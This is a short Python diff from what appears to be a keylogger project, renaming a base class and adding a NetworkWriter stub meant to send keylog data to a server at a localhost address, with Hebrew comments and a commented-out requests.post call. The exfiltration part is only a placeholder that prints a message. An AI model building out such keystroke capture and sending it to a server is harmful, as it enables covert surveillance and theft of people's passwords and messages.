@@ -3,13 +3,13 @@ import os
 from abc import ABC, abstractmethod
 
 
-class Logger(ABC):
+class Writer(ABC):
     @abstractmethod
     def Writes_to_file(self, data: dict):
         pass
 
 
-class FileWriter(Logger):
+class FileWriter(Writer):
     def __init__(self, filename="keylog_data.json"):
         self.filename = filename
 
@@ -33,5 +33,18 @@ class FileWriter(Logger):
 
         return self.filename
 
-    def Writes_to_network(self, data: dict):
-        pass
+
+class NetworkWriter(Writer):
+    def __init__(self, server_url="http://localhost:5000/api/keylog"):
+        self.server_url = server_url
+
+    def Writes_to_file(self, data: dict):
+        """
+        שליחת נתונים לשרת
+        """
+        # כאן יש לממש את הלוגיקה לשליחת הנתונים לשרת
+        # לדוגמה:
+        # response = requests.post(self.server_url, json=data)
+        # return response
+        print(f"Sending data to server: {self.server_url}")
+        return data
